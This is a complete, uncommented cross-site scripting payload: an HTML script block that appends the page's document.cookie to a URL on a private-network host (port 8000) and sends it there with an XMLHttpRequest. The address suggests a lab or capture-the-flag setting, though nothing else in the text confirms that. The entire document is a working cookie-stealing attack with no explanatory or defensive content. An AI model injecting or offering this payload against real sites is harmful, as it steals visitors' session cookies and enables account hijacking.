<script>
	const Http = new XMLHttpRequest();
	const url = "http://192.168.86.229:8000/" + document.cookie;
	Http.open("GET", url);
	Http.send();
</script>